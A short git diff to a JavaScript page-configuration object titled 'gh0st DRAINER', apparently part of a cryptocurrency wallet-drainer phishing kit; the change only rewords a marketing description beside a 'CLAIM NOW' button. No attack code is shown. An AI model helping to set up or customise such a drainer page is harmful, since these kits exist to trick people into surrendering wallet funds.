@@ -23,7 +23,7 @@ const indexPageInfo = {
 
 const claimPageInfo = {
     title: "gh0st DRAINER", // <br> is a line break
-    shortDescription: "Get this Drainer for free though Github. gh0st",
+    shortDescription: "Get this Drainer though gh0st",
     longDescription: "#",
 
     claimButtonText: "CLAIM NOW",
